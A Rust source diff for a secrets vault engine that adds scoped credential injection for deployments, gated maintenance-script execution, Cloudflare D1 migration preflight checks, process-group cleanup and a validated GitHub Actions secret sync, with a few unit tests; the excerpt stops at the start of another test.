@@ -13,7 +13,10 @@ use tokio::process::Command as TokioCommand;
 
 use crate::crypto::SecretMeta;
 use crate::deploy::{
-    discover_deployment_spec, DeploymentProvider, DeploymentResult, DeploymentTarget,
+    approved_target_script, discover_deployment_spec, extract_secret_names, is_migration_file,
+    migration_safety_verdict, parse_d1_migration_query, pending_migrations,
+    target_exec_allowed_keys, wrangler_d1_bindings, D1Preflight, DeploymentProvider,
+    DeploymentResult, DeploymentTarget, TargetExecResult, TargetPreflight, APPROVED_TARGET_SCRIPTS,
 };
 use crate::error::{Result, VaultError};
 use crate::policy::{CallerContext, Operation, PolicyEngine};
@@ -24,6 +27,65 @@ use zeroize::{Zeroize, Zeroizing};
 pub const MAX_BUFFER: usize = 5 * 1024 * 1024; // 5MB output cap per stream
 pub const DEFAULT_TIMEOUT_MS: u64 = 300_000; // 5 minutes
 pub const DEFAULT_SESSION_TTL_MINUTES: u64 = 60; // engine default; MCP passes 120
+
+/// Budget (chars) for failure output surfaced to agents per stream.
+/// Deployment subprocess output is already secret-scrubbed by
+/// `run_with_secrets` (build output never receives credentials), so the tail
+/// is safe to show. Agents cannot diagnose guard refusals from an exit code
+/// alone; without the tail every failure needs a human to re-run it.
+pub const FAILURE_OUTPUT_CHARS: usize = 2000;
+
+/// Last-`max` chars of trimmed output; empty when there is nothing to show.
+fn output_tail(output: &str, max: usize) -> String {
+    let trimmed = output.trim();
+    if trimmed.is_empty() {
+        return String::new();
+    }
+    let chars: Vec<char> = trimmed.chars().collect();
+    if chars.len() > max {
+        chars[chars.len() - max..].iter().collect()
+    } else {
+        trimmed.to_string()
+    }
+}
+
+/// Combine scrubbed stdout/stderr tails for agent-facing failure errors.
+/// Callers must only pass output that is already secret-scrubbed (or never
+/// contained credentials, e.g. credential-free builds).
+fn failure_output_detail(stdout: &str, stderr: &str) -> String {
+    let mut parts = Vec::new();
+    let err = output_tail(stderr, FAILURE_OUTPUT_CHARS);
+    if !err.is_empty() {
+        parts.push(format!("stderr: {err}"));
+    }
+    let out = output_tail(stdout, FAILURE_OUTPUT_CHARS);
+    if !out.is_empty() {
+        parts.push(format!("stdout: {out}"));
+    }
+    if parts.is_empty() {
+        "No output returned".to_string()
+    } else {
+        parts.join("\n")
+    }
+}
+
+// Every Unix child starts its own process group. Kill remaining descendants
+// when the invocation ends or is cancelled, including holders of output pipes.
+#[cfg(unix)]
+struct CommandGroup(i32);
+
+#[cfg(unix)]
+impl Drop for CommandGroup {
+    fn drop(&mut self) {
+        if self.0 > 0 {
+            // SAFETY: this positive PID identifies the group created for our
+            // child; the negative argument targets that group only.
+            unsafe {
+                libc::kill(-self.0, libc::SIGKILL);
+            }
+        }
+    }
+}
 
 /// Options for [`VaultEngine::run`] / [`VaultEngine::run_command`].
 /// `None` fields preserve the "inject everything / use default" semantics.
@@ -224,6 +286,39 @@ impl VaultEngine {
             _ => return Ok(0),
         };
         self.policy.load(path.trim())
+    }
+
+    /// Load owner-managed agent policies from `agent-policy.json` in the
+    /// vault directory. This is the documented human grant mechanism: the
+    /// owner writes per-agent operation allowlists here (e.g. granting
+    /// `run` to an agent scoped to one vault) so approval-gated
+    /// maintenance scripts (`migrate:apply --confirm APPLY`) work without
+    /// threading policy through the environment.
+    ///
+    /// Returns the number of agents registered, or `0` when the file is
+    /// absent. Fails closed on a group/other-writable file: an agent must
+    /// not be able to widen its own permissions by editing the grant.
+    pub fn load_default_policy_file(&mut self) -> Result<usize> {
+        let path = self.store.dir().join("agent-policy.json");
+        if !path.exists() {
+            return Ok(0);
+        }
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let mode = std::fs::metadata(&path)?.permissions().mode();
+            if mode & 0o022 != 0 {
+                return Err(VaultError::Policy(format!(
+                    "refusing to load group/other-writable agent policy file '{}' (mode {:o}); fix with `chmod 600`",
+                    path.display(),
+                    mode & 0o777
+                )));
+            }
+        }
+        let path_str = path.to_str().ok_or_else(|| {
+            VaultError::ConfigCorrupt("agent policy path is not valid UTF-8".to_string())
+        })?;
+        self.policy.load(path_str)
     }
 
     /// Replace the agent policy set programmatically (used by the REST edge
@@ -644,6 +739,24 @@ impl VaultEngine {
     ) -> Result<RunResult> {
         self.op(ctx, Operation::Run, vault_name)?;
 
+        self.run_with_secrets(vault_name, command, args, opts, ctx, "RUN")
+            .await
+    }
+
+    /// Run a command with an explicit secret allowlist after the caller has
+    /// already authorized a higher-level operation such as deployment. This
+    /// deliberately does not grant the generic `run` operation: validated
+    /// deployment targets need a scoped subprocess without turning the agent
+    /// interface into arbitrary command execution.
+    async fn run_with_secrets(
+        &mut self,
+        vault_name: &str,
+        command: &str,
+        args: &[String],
+        opts: &RunOptions<'_>,
+        ctx: Option<&CallerContext>,
+        audit_action: &str,
+    ) -> Result<RunResult> {
         let vault_exists = self.store.vault_exists(vault_name)?;
         let secrets = self.read_secrets(vault_name)?;
         // `allowed_keys` restricts which secrets are injected into the child
@@ -652,6 +765,17 @@ impl VaultEngine {
             Some(keys) => keys.iter().any(|k| k == key),
             None => true,
         };
+        let key = self.require_unlocked_copy()?;
+        if self
+            .store
+            .get_secret_meta(vault_name, &key)?
+            .iter()
+            .any(|(name, meta)| allowed(name) && meta.expired)
+        {
+            return Err(VaultError::Policy(
+                "An approved subprocess credential has expired".into(),
+            ));
+        }
         let secret_keys: Vec<String> = secrets.keys().filter(|k| allowed(k)).cloned().collect();
         // Borrow as &str to avoid cloning secret values for the scrubber.
         let secret_values: Vec<&str> = secrets
@@ -669,7 +793,7 @@ impl VaultEngine {
         }
 
         self.audit(
-            "RUN",
+            audit_action,
             &format!(
                 "vault={} cmd=\"{} {}\" secrets=[{}]",
                 vault_name,
@@ -774,6 +898,7 @@ impl VaultEngine {
     ) -> Result<DeploymentResult> {
         target.validate().map_err(VaultError::Policy)?;
         self.op(ctx, Operation::Deploy, &target.vault)?;
+        self.validate_agent_target(target, ctx)?;
 
         let account_id = self.cf_account_id(&target.vault)?;
         if account_id != target.account_id {
@@ -798,13 +923,94 @@ impl VaultEngine {
             .await?;
         if build.code != 0 {
             return Err(VaultError::Policy(format!(
-                "Build failed for target '{}' with exit code {}",
-                target.id, build.code
+                "Build failed for target '{}' with exit code {}:\n{}",
+                target.id,
+                build.code,
+                failure_output_detail(&build.stdout, &build.stderr)
             )));
         }
 
+        // A build may outlive the unlock or change local target metadata.
+        self.op(ctx, Operation::Deploy, &target.vault)?;
+        self.validate_agent_target(target, ctx)?;
+        if self.cf_account_id(&target.vault)? != target.account_id {
+            return Err(VaultError::Policy(
+                "Deployment account changed during build".into(),
+            ));
+        }
+
+        self.publish_target(target, &output_dir, ctx).await
+    }
+
+    fn validate_agent_target(
+        &self,
+        target: &DeploymentTarget,
+        ctx: Option<&CallerContext>,
+    ) -> Result<()> {
+        if ctx.is_some_and(|caller| caller.caller == crate::policy::Caller::Agent) {
+            let targets = self.store.load_deployment_targets()?;
+            if !targets.iter().any(|registered| registered == target) {
+                return Err(VaultError::Policy(
+                    "Deployment target is not registered with this exact metadata".into(),
+                ));
+            }
+            if target.provider == DeploymentProvider::Worker && !target.worker_package_deploy {
+                return Err(VaultError::Policy(
+                    "Agent deployments require a dynamically adopted Worker target".into(),
+                ));
+            }
+            let workspace = fs::canonicalize(
+                std::env::current_dir()
+                    .map_err(|e| VaultError::Policy(format!("cannot resolve workspace: {e}")))?,
+            )
+            .map_err(|e| VaultError::Policy(format!("cannot resolve workspace: {e}")))?;
+            let target_dir = fs::canonicalize(&target.project_dir).map_err(|e| {
+                VaultError::Policy(format!(
+                    "cannot resolve deployment target directory '{}': {e}",
+                    target.project_dir
+                ))
+            })?;
+            if !target_dir.starts_with(&workspace) {
+                return Err(VaultError::Policy(format!(
+                    "Agent deployment target directory must be inside the current workspace: {}",
+                    target_dir.display()
+                )));
+            }
+            if target.worker_package_deploy {
+                let configs: Vec<_> = ["wrangler.json", "wrangler.jsonc", "wrangler.toml"]
+                    .iter()
+                    .map(|name| target_dir.join(name))
+                    .filter(|path| path.is_file())
+                    .collect();
+                if configs.len() != 1 {
+                    return Err(VaultError::Policy(
+                        "Worker target requires exactly one default Wrangler config".into(),
+                    ));
+                }
+                let spec = discover_deployment_spec(&configs[0]).map_err(VaultError::Policy)?;
+                if spec.provider != target.provider
+                    || spec.project != target.project
+                    || spec.project_dir != target_dir
+                    || spec.build_command != target.build_command
+                    || spec.worker_package_deploy != target.worker_package_deploy
+                {
+                    return Err(VaultError::Policy(
+                        "Worker config no longer matches adopted target".into(),
+                    ));
+                }
+            }
+        }
+        Ok(())
+    }
+
+    async fn publish_target(
+        &mut self,
+        target: &DeploymentTarget,
+        output_dir: &Path,
+        ctx: Option<&CallerContext>,
+    ) -> Result<DeploymentResult> {
         match target.provider {
-            DeploymentProvider::Pages => self.deploy_pages_files(target, &output_dir, ctx).await,
+            DeploymentProvider::Pages => self.deploy_pages_files(target, output_dir, ctx).await,
             DeploymentProvider::Worker => {
                 // Dynamically adopted Workers run the repository's fixed
                 // package deploy script. This preserves package predeploy
@@ -818,7 +1024,7 @@ impl VaultEngine {
                     "CLOUDFLARE_ACCOUNT_ID".to_string(),
                 ];
                 let result = if target.worker_package_deploy {
-                    self.run(
+                    self.run_with_secrets(
                         &target.vault,
                         "npm",
                         &["run".to_string(), "deploy".to_string()],
@@ -828,17 +1034,17 @@ impl VaultEngine {
                             allowed_keys: Some(&allowed_keys),
                         },
                         ctx,
+                        "DEPLOY_RUN",
                     )
                     .await?
                 } else {
                     let args = vec![
+                        "wrangler".to_string(),
                         "deploy".to_string(),
                         "--name".to_string(),
                         target.project.clone(),
-                        "--account-id".to_string(),
-                        target.account_id.clone(),
                     ];
-                    self.run(
+                    self.run_with_secrets(
                         &target.vault,
                         "npx",
                         &args,
@@ -848,15 +1054,22 @@ impl VaultEngine {
                             allowed_keys: Some(&allowed_keys),
                         },
                         ctx,
+                        "DEPLOY_RUN",
                     )
                     .await?
                 };
                 if result.code != 0 {
-                    return Err(VaultError::Policy(format!(
-                        "Worker deployment failed for target '{}' with exit code {}",
-                        target.id, result.code
-                    )));
+                    return Err(VaultError::CommandFailed(
+                        format!("Worker deployment for target '{}'", target.id),
+                        result.code,
+                        failure_output_detail(&result.stdout, &result.stderr),
+                    ));
                 }
+                self.audit(
+                    "DEPLOY",
+                    &format!("target={} provider=worker status=success", target.id),
+                    ctx,
+                );
                 Ok(DeploymentResult {
                     target: target.id.clone(),
                     provider: DeploymentProvider::Worker,
@@ -866,6 +1079,343 @@ impl VaultEngine {
                     files: 0,
                 })
             }
+        }
+    }
+
+    /// Execute an approved repository maintenance script against a registered
+    /// deployment target (e.g. `migrate:apply`, `backup:d1`, `watchdog`).
+    ///
+    /// Security model (same guarantees as `deploy_target`, plus mutation
+    /// gating):
+    /// - The agent supplies only `targetId`, script NAME, and an optional
+    ///   confirmation word. The command body is resolved from the
+    ///   repository's own `package.json` — never from agent input.
+    /// - The script name must be in the closed [`APPROVED_TARGET_SCRIPTS`]
+    ///   allowlist; anything else is `policy_denied`.
+    /// - Gated on `Operation::Run`, which is NOT in the default agent op set:
+    ///   agents get `policy_denied` until a human grants `run` via policy
+    ///   file. This is the `policy_denied for run` contract.
+    /// - Mutating scripts additionally require the typed confirmation word
+    ///   AND pass Vaultly's own pending-migration safety verdicts (defense
+    ///   in depth alongside the repository's guards): any pending
+    ///   destructive-but-unguarded migration, or any failure to verify,
+    ///   refuses the execution fail-closed.
+    /// - Cleared environment with a fixed credential key set, output
+    ///   scrubbing, and audit — via `run_with_secrets`.
+    pub async fn exec_target_script(
+        &mut self,
+        target: &DeploymentTarget,
+        script_name: &str,
+        confirm: Option<&str>,
+        ctx: Option<&CallerContext>,
+    ) -> Result<TargetExecResult> {
+        target.validate().map_err(VaultError::Policy)?;
+        self.op(ctx, Operation::Run, &target.vault)?;
+        self.validate_agent_target(target, ctx)?;
+
+        // Fail fast on unknown scripts and missing confirmations BEFORE
+        // touching credentials or the network.
+        let approved = approved_target_script(script_name).ok_or_else(|| {
+            VaultError::Policy(format!(
+                "Script '{}' is not an approved target maintenance script for '{}'. Approved: {}",
+                script_name,
+                target.id,
+                APPROVED_TARGET_SCRIPTS
+                    .iter()
+                    .map(|s| s.name)
+                    .collect::<Vec<_>>()
+                    .join(", ")
+            ))
+        })?;
+        if approved.mutating {
+            if let Some(expected) = approved.confirm_word {
+                if confirm != Some(expected) {
+                    let msg = format!(
+                        "Script '{}' mutates production. Re-run with confirm=\"{}\" to record intent.",
+                        script_name, expected
+                    );
+                    return Err(VaultError::Policy(msg));
+                }
+            }
+        }
+
+        let account_id = self.cf_account_id(&target.vault)?;
+        if account_id != target.account_id {
+            return Err(VaultError::Policy(format!(
+                "Deployment target '{}' is bound to a different Cloudflare account",
+                target.id
+            )));
+        }
+
+        // Repository root is the server working directory (run CLI/MCP from
+        // the repository root); the target directory must be inside it.
+        let root = fs::canonicalize(
+            std::env::current_dir()
+                .map_err(|e| VaultError::Policy(format!("cannot resolve repository root: {e}")))?,
+        )
+        .map_err(|e| VaultError::Policy(format!("cannot resolve repository root: {e}")))?;
+        let target_dir = fs::canonicalize(&target.project_dir).map_err(|e| {
+            VaultError::Policy(format!(
+                "cannot resolve deployment target directory '{}': {e}",
+                target.project_dir
+            ))
+        })?;
+        if !target_dir.starts_with(&root) {
+            return Err(VaultError::Policy(format!(
+                "Agent exec target directory must be inside the current workspace: {}",
+                target_dir.display()
+            )));
+        }
+        let package_raw = fs::read_to_string(root.join("package.json"))
+            .map_err(|e| VaultError::Policy(format!("cannot read repository package.json: {e}")))?;
+        let package: Value = serde_json::from_str(&package_raw)
+            .map_err(|e| VaultError::Policy(format!("invalid repository package.json: {e}")))?;
+        if package
+            .get("scripts")
+            .and_then(|s| s.get(script_name))
+            .and_then(Value::as_str)
+            .is_none()
+        {
+            return Err(VaultError::Policy(format!(
+                "Script '{}' is not defined in the repository package.json",
+                script_name
+            )));
+        }
+
+        // Defense in depth for mutations: Vaultly independently refuses when
+        // it can see pending destructive-but-unguarded migrations, or when it
+        // cannot verify migration safety at all (fail closed).
+        if approved.mutating {
+            let verdicts = self.target_d1_verdicts(target, ctx).await.map_err(|e| {
+                VaultError::Policy(format!(
+                    "Cannot verify migration safety for '{}': {e}. Refusing.",
+                    target.id
+                ))
+            })?;
+            let mut unsafe_files = Vec::new();
+            let mut errored = Vec::new();
+            for db in &verdicts {
+                if let Some(err) = &db.error {
+                    errored.push(format!("{}: {}", db.database_name, err));
+                }
+                for v in &db.verdicts {
+                    if !v.safe {
+                        unsafe_files.push(v.file.clone());
+                    }
+                }
+            }
+            if !unsafe_files.is_empty() || !errored.is_empty() {
+                return Err(VaultError::Policy(format!(
+                    "Refusing '{}' on '{}': unsafe pending migrations [{}]; unverifiable databases [{}].",
+                    script_name,
+                    target.id,
+                    unsafe_files.join(", "),
+                    errored.join("; ")
+                )));
+            }
+        }
+
+        let allowed = target_exec_allowed_keys();
+        let root_str = root.to_string_lossy().to_string();
+        let result = self
+            .run_with_secrets(
+                &target.vault,
+                "npm",
+                &["run".to_string(), script_name.to_string()],
+                &RunOptions {
+                    cwd: Some(root_str.as_str()),
+                    timeout_ms: Some(1_800_000),
+                    allowed_keys: Some(&allowed),
+                },
+                ctx,
+                "EXEC_RUN",
+            )
+            .await?;
+        if result.code != 0 {
+            return Err(VaultError::CommandFailed(
+                format!(
+                    "Target maintenance script '{script_name}' for '{}'",
+                    target.id
+                ),
+                result.code,
+                failure_output_detail(&result.stdout, &result.stderr),
+            ));
+        }
+        self.audit(
+            "EXEC",
+            &format!("target={} script={} status=success", target.id, script_name),
+            ctx,
+        );
+        Ok(TargetExecResult {
+            target: target.id.clone(),
+            script: script_name.to_string(),
+            status: "success".into(),
+            code: 0,
+            injected_keys: result.secrets_injected,
+            scrubbed: result.scrubbed,
+        })
+    }
+
+    /// Read-only preflight for a deployment target: worker existence, worker
+    /// secret names, and per-D1-database applied/pending migrations with
+    /// safety verdicts. No mutations, no credential values. Gated on the
+    /// `Deploy` operation (granted to agents by default) since preflight is
+    /// part of the deployment workflow.
+    pub async fn preflight_target(
+        &mut self,
+        target: &DeploymentTarget,
+        ctx: Option<&CallerContext>,
+    ) -> Result<TargetPreflight> {
+        target.validate().map_err(VaultError::Policy)?;
+        self.op(ctx, Operation::Deploy, &target.vault)?;
+        self.validate_agent_target(target, ctx)?;
+
+        let account_id = self.cf_account_id(&target.vault)?;
+        if account_id != target.account_id {
+            return Err(VaultError::Policy(format!(
+                "Deployment target '{}' is bound to a different Cloudflare account",
+                target.id
+            )));
+        }
+
+        let (_id, workers) = self.list_workers(&target.vault, ctx).await?;
+        let worker_found = workers.iter().any(|w| w == &target.project);
+        let worker_secret_names = match self
+            .worker_secrets(&target.vault, &target.project, "list", None, None, ctx)
+            .await
+        {
+            Ok(r) => extract_secret_names(&r.data),
+            Err(_) => Vec::new(),
+        };
+        let databases = self
+            .target_d1_verdicts(target, ctx)
+            .await
+            .unwrap_or_default();
+
+        Ok(TargetPreflight {
+            target: target.id.clone(),
+            account_id,
+            worker_found,
+            worker_secret_names,
+            databases,
+        })
+    }
+
+    /// Inspect every D1 database bound by the target's Wrangler config:
+    /// remote applied migrations vs local files, with safety verdicts.
+    /// Per-database failures are captured in `D1Preflight.error`; an
+    /// unreadable config fails the whole check (fail closed).
+    async fn target_d1_verdicts(
+        &mut self,
+        target: &DeploymentTarget,
+        ctx: Option<&CallerContext>,
+    ) -> Result<Vec<D1Preflight>> {
+        let target_dir = PathBuf::from(&target.project_dir);
+        let config_path = Self::target_wrangler_config(&target_dir).ok_or_else(|| {
+            VaultError::Policy(format!(
+                "No Wrangler config found in target directory '{}'",
+                target.project_dir
+            ))
+        })?;
+        let bindings = wrangler_d1_bindings(&config_path).map_err(VaultError::Policy)?;
+        let config_dir = config_path
+            .parent()
+            .map(Path::to_path_buf)
+            .unwrap_or_else(|| target_dir.clone());
+        let mut out = Vec::new();
+        for binding in bindings {
+            out.push(
+                self.d1_binding_verdict(target, &binding, &config_dir, ctx)
+                    .await,
+            );
+        }
+        Ok(out)
+    }
+
+    /// First existing default Wrangler config in a target directory.
+    fn target_wrangler_config(target_dir: &Path) -> Option<PathBuf> {
+        ["wrangler.json", "wrangler.jsonc", "wrangler.toml"]
+            .iter()
+            .map(|name| target_dir.join(name))
+            .find(|path| path.is_file())
+    }
+
+    async fn d1_binding_verdict(
+        &mut self,
+        target: &DeploymentTarget,
+        binding: &crate::deploy::D1Binding,
+        config_dir: &Path,
+        ctx: Option<&CallerContext>,
+    ) -> D1Preflight {
+        let blank = |error: String| D1Preflight {
+            database_name: binding.database_name.clone(),
+            database_id: binding.database_id.clone(),
+            applied: 0,
+            pending: Vec::new(),
+            verdicts: Vec::new(),
+            error: Some(error),
+        };
+        // 1. Verify the database exists in the bound account.
+        let db_path = format!("/d1/database/{}", urlencode(&binding.database_id));
+        match self
+            .cloudflare_account_api(&target.vault, "GET", &db_path, None, ctx)
+            .await
+        {
+            Ok(r) if r.status < 400 => {}
+            Ok(r) => {
+                return blank(format!("database lookup failed: HTTP {}", r.status));
+            }
+            Err(e) => return blank(format!("database lookup failed: {e}")),
+        }
+        // 2. Remote applied migrations (missing table = fresh database).
+        let query_path = format!("/d1/database/{}/query", urlencode(&binding.database_id));
+        let applied = match self
+            .cloudflare_account_api(
+                &target.vault,
+                "POST",
+                &query_path,
+                Some(serde_json::json!({"sql": "SELECT name FROM d1_migrations"})),
+                ctx,
+            )
+            .await
+        {
+            Ok(r) => match parse_d1_migration_query(&r.data) {
+                Ok(names) => names,
+                Err(e) => return blank(format!("migration query failed: {e}")),
+            },
+            Err(e) => return blank(format!("migration query failed: {e}")),
+        };
+        // 3. Local migration files.
+        let migrations_dir = binding.migrations_dir.as_deref().unwrap_or("migrations");
+        let dir = config_dir.join(migrations_dir);
+        let mut local_files: Vec<String> = match fs::read_dir(&dir) {
+            Ok(entries) => entries
+                .filter_map(|e| e.ok())
+                .map(|e| e.file_name().to_string_lossy().to_string())
+                .filter(|n| is_migration_file(n))
+                .collect(),
+            Err(e) => {
+                return blank(format!(
+                    "cannot list local migrations '{}': {e}",
+                    dir.display()
+                ))
+            }
+        };
+        local_files.sort();
+        // 4. Diff + safety verdicts (pending files only).
+        let pending = pending_migrations(&local_files, &applied);
+        let mut verdicts = Vec::new();
+        for file in &pending {
+            let sql = fs::read_to_string(dir.join(file)).unwrap_or_default();
+            verdicts.push(migration_safety_verdict(file, &sql));
+        }
+        D1Preflight {
+            database_name: binding.database_name.clone(),
+            database_id: binding.database_id.clone(),
+            applied: applied.len(),
+            pending,
+            verdicts,
+            error: None,
         }
     }
 
@@ -1179,6 +1729,7 @@ impl VaultEngine {
         let mut child = TokioCommand::new(command);
         child
             .env_clear()
+            .kill_on_drop(true)
             .args(args)
             .envs(env.iter().map(|(k, v)| (k, v)))
             .stdin(Stdio::null())
@@ -1194,9 +1745,14 @@ impl VaultEngine {
             child.current_dir(dir);
         }
 
+        #[cfg(unix)]
+        child.process_group(0);
+
         let mut child = child
             .spawn()
             .map_err(|e| VaultError::Policy(format!("Failed to start '{}': {}", command, e)))?;
+        #[cfg(unix)]
+        let group = CommandGroup(child.id().unwrap_or(0) as i32);
         let mut stdout = child.stdout.take().ok_or_else(|| {
             VaultError::CommandSpawn(command.to_string(), "stdout pipe missing".into())
         })?;
@@ -1205,16 +1761,18 @@ impl VaultEngine {
         })?;
 
         // Read both streams in parallel so a chatty stderr can't deadlock stdout
-        let out_task = tokio::spawn(async move { read_capped(&mut stdout).await });
-        let err_task = tokio::spawn(async move { read_capped(&mut stderr).await });
+        let mut out_task = tokio::spawn(async move { read_capped(&mut stdout).await });
+        let mut err_task = tokio::spawn(async move { read_capped(&mut stderr).await });
 
         let status = tokio::select! {
             status = child.wait() => status,
             _ = tokio::time::sleep(Duration::from_millis(timeout_ms)) => {
+                #[cfg(unix)]
+                drop(group);
                 let _ = child.kill().await;
                 let _ = child.wait().await;
-                let (out, out_trunc) = out_task.await.unwrap_or_default();
-                let (err, err_trunc) = err_task.await.unwrap_or_default();
+                let (out, out_trunc) = finish_output(&mut out_task).await;
+                let (err, err_trunc) = finish_output(&mut err_task).await;
                 let stderr = format!(
                     "{}\n⏱ Command timed out after {}s and was killed.\n",
                     fmt_buf(err, err_trunc),
@@ -1230,13 +1788,15 @@ impl VaultEngine {
             }
         };
 
-        let (out, out_trunc) = out_task.await.unwrap_or_default();
-        let (err, err_trunc) = err_task.await.unwrap_or_default();
+        #[cfg(unix)]
+        drop(group);
+        let (out, out_trunc) = finish_output(&mut out_task).await;
+        let (err, err_trunc) = finish_output(&mut err_task).await;
 
         Ok(RunResult {
             stdout: fmt_buf(out, out_trunc),
             stderr: fmt_buf(err, err_trunc),
-            code: status.ok().and_then(|s| s.code()).unwrap_or(0),
+            code: status.ok().and_then(|s| s.code()).unwrap_or(1),
             secrets_injected: injected_keys,
             scrubbed: false,
         })
@@ -1724,6 +2284,182 @@ impl VaultEngine {
         }
     }
 
+    // ─── GitHub secret sync ─────────────────────────────
+    //
+    // Brokered copy of one vault credential into a GitHub Actions repository
+    // secret. The value travels vault -> `gh` child stdin only; it is never
+    // returned to the caller, logged, or placed on a command line. Names are
+    // strictly validated so agent-controlled inputs cannot reshape the fixed
+    // `gh secret set` invocation. `gh` authenticates with the human's existing
+    // login (keychain/credential helper), so no GitHub token is stored in any
+    // vault for this operation.
+
+    /// Validate `owner/repo` without accepting flags, paths, or URLs.
+    fn validate_github_repo(repo: &str) -> Result<()> {
+        let valid_part = |part: &str| {
+            !part.is_empty()
+                && part.len() <= 100
+                && part
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
+        };
+        match repo.split_once('/') {
+            Some((owner, name)) if valid_part(owner) && valid_part(name) => Ok(()),
+            _ => Err(VaultError::Policy(
+                "GitHub repo must look like 'owner/name' (letters, numbers, '-', '_', '.')".into(),
+            )),
+        }
+    }
+
+    /// Validate a GitHub Actions secret name (uppercase, digits, underscore).
+    fn validate_github_secret_name(name: &str) -> Result<()> {
+        if name.len() <= 64
+            && !name.is_empty()
+            && name
+                .chars()
+                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
+        {
+            Ok(())
+        } else {
+            Err(VaultError::Policy(
+                "GitHub secret name must be 1-64 chars of A-Z, 0-9, '_'".into(),
+            ))
+        }
+    }
+
+    /// Validate a GitHub environment name (letters, numbers, '-', '_').
+    fn validate_github_env(env: &str) -> Result<()> {
+        if !env.is_empty()
+            && env.len() <= 100
+            && env
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+        {
+            Ok(())
+        } else {
+            Err(VaultError::Policy(
+                "GitHub environment must be 1-100 chars of letters, numbers, '-', '_'".into(),
+            ))
+        }
+    }
+
+    /// Copy one credential from a vault into a GitHub Actions repository
+    /// secret. Returns names-only status; the value is never exposed.
+    pub async fn sync_github_secret(
+        &mut self,
+        source_vault: &str,
+        source_key: &str,
+        repo: &str,
+        secret_name: &str,
+        env: Option<&str>,
+        ctx: Option<&CallerContext>,
+    ) -> Result<String> {
+        self.op(ctx, Operation::GithubSync, source_vault)?;
+        Self::validate_github_repo(repo)?;
+        Self::validate_github_secret_name(secret_name)?;
+        // Environment secrets shadow repo secrets for jobs pinned to that
+        // environment; syncing the repo copy alone leaves CI broken.
+        if let Some(env) = env {
+            Self::validate_github_env(env)?;
+        }
+        if source_key.trim().is_empty() || source_key.chars().any(|c| c.is_control()) {
+            return Err(VaultError::Policy("source key name is invalid".into()));
+        }
+        let key = self.require_unlocked_copy()?;
+        if self
+            .store
+            .get_secret_meta(source_vault, &key)?
+            .iter()
+            .any(|(name, meta)| name == source_key && meta.expired)
+        {
+            return Err(VaultError::Policy(
+                "The source credential has expired".into(),
+            ));
+        }
+        let secrets = self.read_secrets(source_vault)?;
+        let value = secrets
+            .get(source_key)
+            .and_then(|v| v.as_str())
+            .ok_or_else(|| VaultError::SecretNotFound(source_key.into(), source_vault.into()))?;
+        if value.is_empty() {
+            return Err(VaultError::Policy("source credential is empty".into()));
+        }
+        // Borrow as &str so the scrubber never clones the value.
+        let secret_values = [value];
+        self.audit(
+            "GITHUB_SYNC",
+            &format!(
+                "vault={} key={} repo={} env={} secret={}",
+                source_vault,
+                source_key,
+                repo,
+                env.unwrap_or("-"),
+                secret_name
+            ),
+            ctx,
+        );
+        // Fixed script: names travel via env (no shell parsing of agent
+        // input), the value travels via a dedicated env var into `gh` stdin.
+        // Nothing agent-controlled appears on the command line. The optional
+        // environment flag is interpolated only after strict validation
+        // (no quotes, spaces, or shell metacharacters possible).
+        let env_flag = env.map(|e| format!(" --env \"{e}\"")).unwrap_or_default();
+        let script = format!(
+            "gh secret set \"$VAULTLY_SYNC_SECRET\" --repo \"$VAULTLY_SYNC_REPO\"{env_flag} --body \"$VAULTLY_SYNC_BODY\""
+        );
+        let mut child_env = vec![
+            ("VAULTLY_SYNC_SECRET".to_string(), secret_name.to_string()),
+            ("VAULTLY_SYNC_REPO".to_string(), repo.to_string()),
+            ("VAULTLY_SYNC_BODY".to_string(), value.to_string()),
+        ];
+        // `gh` authenticates via the human's config file (~/.config/gh); the
+        // spawn environment is otherwise cleared, so HOME must be restored
+        // for `gh` to find it. HOME itself is not secret.
+        if let Some(home) = std::env::var_os("HOME") {
+            child_env.push(("HOME".to_string(), home.to_string_lossy().into_owned()));
+        }
+        let result = self
+            .spawn(
+                "sh",
+                &["-c".to_string(), script.to_string()],
+                &child_env,
+                None,
+                120_000,
+            )
+            .await
+            .map_err(|e| VaultError::Policy(format!("GitHub sync failed to start: {}", e)))?;
+        // Scrub before any error text can reach the caller.
+        let stdout = scrub_output(&result.stdout, &secret_values);
+        let stderr = scrub_output(&result.stderr, &secret_values);
+        if stdout != result.stdout || stderr != result.stderr {
+            self.audit(
+                "SCRUB",
+                "Scrubbed secret values from GitHub sync output",
+                ctx,
+            );
+        }
+        if result.code != 0 {
+            return Err(VaultError::CommandFailed(
+                format!(
+                    "GitHub secret sync to '{}/{}' (env {})",
+                    repo,
+                    secret_name,
+                    env.unwrap_or("-")
+                ),
+                result.code,
+                failure_output_detail(&stdout, &stderr),
+            ));
+        }
+        Ok(format!(
+            "Synced '{}' from vault '{}' to GitHub secret '{}/{}' (env {}, value never shown)",
+            source_key,
+            source_vault,
+            repo,
+            secret_name,
+            env.unwrap_or("-")
+        ))
+    }
+
     // ─── Backup / Restore ─────────────────────────────────
 
     pub fn get_encrypted_vaults(&self) -> Map<String, Value> {
@@ -1851,6 +2587,16 @@ fn same_target_identity(left: &DeploymentTarget, right: &DeploymentTarget) -> bo
         && left.output_dir == right.output_dir
         && left.branch == right.branch
         && left.worker_package_deploy == right.worker_package_deploy
+}
+
+async fn finish_output(task: &mut tokio::task::JoinHandle<(Vec<u8>, bool)>) -> (Vec<u8>, bool) {
+    match tokio::time::timeout(Duration::from_secs(1), &mut *task).await {
+        Ok(Ok(output)) => output,
+        _ => {
+            task.abort();
+            (Vec::new(), true)
+        }
+    }
 }
 
 async fn read_capped(stream: &mut (impl AsyncRead + Unpin)) -> (Vec<u8>, bool) {
@@ -2101,6 +2847,163 @@ mod tests {
         (engine, dir)
     }
 
+    #[test]
+    fn failure_output_detail_combines_both_streams() {
+        let detail = failure_output_detail("guard refused: pending migrations", "npm ERR! exit 1");
+        assert!(detail.contains("stdout: guard refused: pending migrations"));
+        assert!(detail.contains("stderr: npm ERR! exit 1"));
+    }
+
+    #[test]
+    fn failure_output_detail_skips_empty_streams() {
+        assert_eq!(failure_output_detail("", ""), "No output returned");
+        assert_eq!(
+            failure_output_detail("only stdout", "  \n "),
+            "stdout: only stdout"
+        );
+    }
+
+    #[test]
